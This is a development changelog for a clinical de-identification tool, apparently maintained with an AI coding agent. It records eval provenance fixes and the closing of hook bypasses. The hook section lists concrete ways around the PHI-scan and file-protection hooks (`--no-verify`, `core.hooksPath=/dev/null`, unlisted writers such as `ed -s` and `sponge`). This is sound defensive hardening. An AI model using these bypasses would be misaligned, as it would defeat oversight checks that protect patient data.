  `thresholds_sha`). Reference runs emit a `calibration` block instead. `--gate` reads the measured
  rate so the calibration assertions still work; the release gate is the provenance-checked one.
- **`eval/harness.py`** — `RedteamProvenance` gates the read of `contextual.reid_rate`: pipeline
  masker AND matching detector AND matching eval_sha, or the field stays null and the gate stays
  UNENFORCEABLE. The rejected number and the reason are emitted beside it, so the number can never
  be read without its source. `PredictedSpan.checksum_validated` added;
  `checksum_id_precision` now counts only actually-validated spans.
- **`eval/provenance.py`** (new) — `git_eval_sha` / `file_sha256` single-sourced out of
  `eval/run.py`, because two artifacts that compare `eval_sha` must compute it the same way.
- **`eval/run.py`** — `--detector pipeline` registered; warms batch-capable detectors; passes one
  `eval_sha` into `evaluate`.
- **`core/tests/checksum_protection_armed.rs`** (new, 6 tests) — generates checksum-valid TCKNs AT
  RUNTIME, never on disk, and exercises L1 validation, `Merged::is_protected()`, the
  `demote_to_keep` refusal (and that its error names no digits), and the full pipeline masking.
  Includes the contrast case: the same digits with one check digit broken are demotable, which is
  the state of every TCKN in `eval/gold`.
- **`docs/DECISIONS.md`** — D-029 (provenance-checked contextual gate), D-030 (RESOLVES D-022;
  checksum precision over validated spans, and the I8 tension).
- `just red-team` / `red-team-gates` / `red-team-emit` now run `--masker pipeline`;
  `just red-team-calibrate` added for the three reference points.

### BROKE / CORRECTED

- **`contextual_reid_rate = 0.0303 PASS` was a number from a different run.** It came from
  `eval/results/redteam.json` generated against `OracleMasker`, and `eval/harness.py:49` read it
  whatever detector was being scored — byte-identical under the null detector and the full
  pipeline, and one of only two gates the null detector passed. Regenerated against the pipeline:
  **0.9091** (150/165 attackable documents), ceiling 0.05, **FAIL**. Six of seven attack classes
  land. The old committed run artifacts (`m0-null-baseline.json`, `20260719T174139Z-null.json`)
  predate the report and correctly carry `null`; only the gitignored `latest.json` had the false
  PASS, and it now reads UNENFORCEABLE with the rejection reason in
  `contextual.reid_rate_provenance`.
- **`checksum_id_precision = 0.9902` was unmeasurable by construction.** It was computed over
  predictions selected by LABEL. Over actually-validated spans the denominator is zero: the corpus
  holds 128 non-overlapping eleven-digit runs and 0 checksum-valid ones, because I8 forbids one to
  exist. The gate now reads `n/a` / UNENFORCEABLE, which is the truth, and the guardrail is proved
  armed in `core/tests/checksum_protection_armed.rs` instead.
- `tests/test_harness.py::test_perfect_detector_...` asserted `checksum_id_precision == 1.0`. It
  now asserts `is None` — the gold-derived detector reproduces labels and validates no checksum.

### OPEN

- Provenance matching compares `eval_sha` by string equality, and a dirty tree yields
  `"uncommitted"` on both sides, so two uncommitted runs match. `scripts/publish.py` is the I5
  check that refuses to ship a card built on `"uncommitted"`; the gate itself does not.
- `contextual_reid_rate_max` will stay FAIL until L2/L3 exist. NAME recall is 0.0000, so the true
  contextual rate is near the null masker's 0.9333, and it should be.
- The pipeline run also exposes `recall_direct_critical 0.4291`, `micro_f1_direct 0.5425` and
  `document_leak_rate 0.9474` — all FAIL, all honest, all M3 work.

### NEXT

- M3: wire `bindings/ort` in so `--detector pipeline` has an L2 ensemble, then re-read every
  number above. The red team should move first and most.

## 2026-07-19 — the vocabulary and L5 were dead code in every shipped binary

### CHANGED

- `core/src/route/vocabulary.rs` (new). The nine `eval/allowlist/*.txt` files are compiled in with
  `include_str!` and indexed once behind a `OnceLock`. This is the module that used to be
  `route::tests_support::bundled_allowlist`, `#[cfg(test)]`, at `core/src/route/mod.rs:52`.
- `core/src/pipeline.rs:335` — `Pipeline::new` now installs that vocabulary instead of
  `MedicalAllowlist::new()` (empty). The opt-out is `Pipeline::without_medical_allowlist`, named for
  what it costs. `core/tests/pipeline_end_to_end.rs:364` now asks for it explicitly.
- `core/src/surrogate/mod.rs` — L5's collision set is built from `route::vocabulary::terms()`
  instead of a SECOND hand-written list of the same nine `include_str!` paths. One list now.
- `bindings/cli/src/mask.rs` — `build()` installs L5 from a per-run `getrandom` salt. New flags
  `--placeholder-labels` and `--no-medical-allowlist`, both opt-OUTS, both in `deid --help`.
- `bindings/mcp/src/server.rs` — `Server::new` is now `Result`, installs L5 from a per-process salt,
  and gains `ServerConfig::{no_medical_allowlist, placeholder_labels}` plus the matching flags.
- `bindings/wasm/src/lib.rs` — `deidentify` and `deidentifyWithContextualResponse` REQUIRE
  `saltKeyMaterial`; the opt-out is the separately named `deidentifyWithLabelPlaceholders`. The
  browser cannot draw entropy (js-sys/web-sys are banned here), so the host supplies it.
  `tests/no_network.mjs` and `tests/index.html` updated to call `crypto.getRandomValues`.
- `bindings/python/src/lib.rs` — L5 by default from a per-document `getrandom` salt; keywords
  `salt_key_material` and `label_placeholders` are the two explicit deviations. Stub and two tests
  in `test_roundtrip.py` updated (they asserted on `[TCKN]`, which is no longer the default).

### TESTS

- `core/src/route/vocabulary.rs::tests` — drift: every `eval/allowlist/*.txt` on disk is in
  `SOURCES`, and each embedded copy is byte-identical to the file the eval harness scores. The only
  `std::fs` in `core/`, `#[cfg(test)]`, justified in place.
- `bindings/cli/tests/vocabulary_is_reachable.rs` (5) — execs `CARGO_BIN_EXE_deid`.
- `bindings/mcp/tests/vocabulary_is_reachable.rs` (4) — drives the JSON-RPC surface.
- `bindings/wasm/src/lib.rs::tests` (4) — the full `Costa`/`costa'da` discrimination through the
  binding's L3 entry point, plus the A/B against `without_medical_allowlist`.
- `bindings/python/tests/test_vocabulary_is_reachable.py` (6) — the same, through `deid_tr.Pipeline`.

### BROKE / FOUND

- **A shipped binary cannot mask a NAME at all, and this change does not fix that.** No layer in a
  released build proposes a name span: L1 has no name rule (`core/src/rules/mod.rs:234` runs tckn,
  vkn, iban, sgk, phone, date, email, mrn), L2 ships with an empty ensemble, and L3 is tier-gated on
  a local model only Python and WASM can supply. So `Prof. Dr. Marco Costa` is never a CANDIDATE and
  no allowlist wiring could have masked it. The CLI and MCP tests therefore prove the same
  discrimination on `B12` — a lab analyte that `rules::mrn` really does propose — and say so in
  their module headers rather than asserting something weaker and calling it the fixture.
- `bindings/ort` and `bindings/llm` are wired into NOTHING. Both are workspace members, both are
  exercised only by their own tests, and neither is reachable from `deid`, `deid-mcp`, the wheel or
  the wasm bundle. That is the same class of defect as this one, one layer up.
- `tests/test_report.py::test_unenforceable_gates_list_names_the_gate_and_the_reason` fails, and
  failed before this change: `unenforceable_gates` gives `checksum_id_precision` a reason that does
  not contain "EMPTY PREDICTION SET". Untouched here.

### NEXT

- M3: wire `bindings/ort` into the CLI and the gateway so a name is a candidate, then re-run the
  CLI/MCP tests with the real fixture instead of the `B12` stand-in.

---

## 2026-07-19 — five hook bypasses closed, a duplicated ADR id, and two false claims corrected

### CHANGED

- `scripts/hooks/block_egress.sh` — **N15, the PHI scan was fully bypassable.**
  `git commit --no-verify`, `git commit -n` and `git -c core.hooksPath=/dev/null commit` were all
  ALLOWED, and each runs a commit with `pre_commit_phi.sh` never invoked. Two new rules block them:
  a `commit`-scoped flag test (over a copy of the segment with quoted strings emptied, so a commit
  MESSAGE naming `-n` or `--no-verify` stays ordinary work) and a `core.hooksPath` test against the
  RAW segment, which catches the `GIT_CONFIG_KEY_n=` environment spelling that the prefix stripper
  would otherwise remove. `-n` on other subcommands is untouched: `git clean -n` is a dry run.
- `scripts/hooks/block_egress.sh` — **I7/I2/I5 inverted from a denylist of writers to an allowlist
  of uses.** The old I7 rule named the destructive verbs, so five writers nobody had listed went
  straight through, all found in one sitting: `ed -s`, `ex -sc`, `python3 -c "open(...,'w')"`,
  `... | sponge`, and `cp /dev/null`. The set of programs that can write a file is unbounded, so
  that rule could never be finished. It now keys on the TARGET PATH: a fixture may appear only as
  (1) an argument to a read-only command, (2) a `>>` append, (3) a `tee -a` target, (4) a `git add`
  argument, or (5) an input behind an explicit read flag (`--gold`, `--fixtures`, `--input`) with a
  non-inline-interpreter verb. Everything else blocks, including shapes nobody has thought of yet.
  `eval/thresholds.yaml` (I2) and the model-card paths (I5) get the same inversion with the
  smallest allowlist of all: a read, and nothing else.
- `scripts/hooks/test_hooks.sh` — a fourth adversarial round, 34 new cases (229 -> **263, all
  passing**): every bypass above as a BLOCK, every legitimate shape beside it as an ALLOW,
  including `git clean -n`, a commit message that says `--no-verify`, `diff` of two fixtures, the
  harness reading gold behind `--fixtures`, and `ed` CREATING a new fixture (creation stays free).
  Two cases exist purely to pin the allowlist property: an UNKNOWN writer (`frobnicate --clobber`)
  and an unknown writer behind `--out` both block without being named.
- `docs/DECISIONS.md` — **two ADRs were both numbered D-023.** The later one (the L5 keyed digest)
  is renumbered **D-024**, with a numbering note recording the collision and the renumber rather
  than erasing it; the earlier keeps D-023 because code already cites it under that number.
  Citations updated in `core/src/surrogate/mod.rs`, `core/src/surrogate/keyed_hash.rs` (x2) and
  D-025. `grep -oE '^## D-[0-9]{3}' docs/DECISIONS.md | sort | uniq -d` prints nothing.
- **D-027 appended — the Safe Harbor cost model was wrong by an order of magnitude.** The brief's
  "adjudicator sees 2-5% of spans" is measured at **40.0%, 268 of 670 routed candidates**, by a new
  test `core/src/route/mod.rs::corpus_measurement::report_the_router_escalation_rate_over_routed_candidates`
  that runs L1 + `union_widest` + `route()` over the committed corpus and prints the breakdown.
  D-023's 3.87% is a DIFFERENT DENOMINATOR (vocabulary occurrences, 74/1910) and does not bound it;
  both denominators are now stated explicitly everywhere the number appears. No constant was
  touched: moving `ESCALATION_CONFIDENCE_MAX` would be tuning the metric.
- **D-028 appended — L5 preserves the date FORMAT and therefore a date-length tell.** Brief property
  L5(c) says length is not preserved; measured per label over the corpus by a new test
  `core/src/surrogate/mod.rs::tests::length_correlation_by_label_over_the_committed_corpus`, the
  DATE family is r = 0.85 (`DATE_BIRTH`), 0.89 (`DATE_ADMISSION`), **1.0000 (`DATE_DEATH`)**,
  against -0.06 for `PATIENT_NAME`. Format preservation is KEPT (property (a) and downstream
  parsers win, and what leaks is the author's template, which the unmasked prose already shows);
  the claim is corrected in `CLAUDE.md`, the L5 module doc and `format.rs::DateStyle`. The name
  family keeps a real gate: |r| < 0.35 for every `*_NAME` label, dates excluded BY NAME rather than
  by loosening the bound.
- `core/src/route/router.rs`, `core/src/route/mod.rs`, `core/src/pipeline.rs`, `docs/PLAN.md`,
  `CLAUDE.md` — every surviving "2-5%" now says what was measured and against which denominator.
- `eval/rust-bridge/src/main.rs`, `core/src/route/mod.rs` (x3) — four clippy findings on
  rust 1.94.1 (`len() >= 1`, three `needless_borrow`) fixed so `clippy -D warnings` is green.

### BROKE / FOUND

- **`just lint` fails on an environment gap, not on this change**: `eval/schema.py:23 Library stubs
  not installed for "yaml"`. Installing `types-PyYAML` is a network operation and needs human
  approval. `fmt`, `clippy -D warnings`, `cargo test --all` (23 suites), `pytest` (153) and
  `just eval` are all green.
- **`core/src/route/mod.rs:165` prints document text**: `println!("DBG {:?} {:?}", &text[start..end], ...)`
  inside `corpus_measurement`. The fixtures are synthetic so nothing leaked, but it is a debug
  leftover that writes covered text to stdout, and it is the exact shape I4 exists to stop -- it
  survives only because `guard_invariants.sh` cannot follow a slice expression, which its own
  RESIDUAL CEILING note predicts. Not touched here; it wants deleting.
- **The escalation measurement's largest contributor is `MRN` (155 of 268)**, a type with no
  checksum to validate. If the adjudicator budget has to come down, that is where to look -- not at
  the confidence ceiling.

### NEXT

- Delete the `DBG` println above, and give the router escalation rate a row in the eval report so a
  cost regression is as visible as an accuracy one (D-027's third consequence).
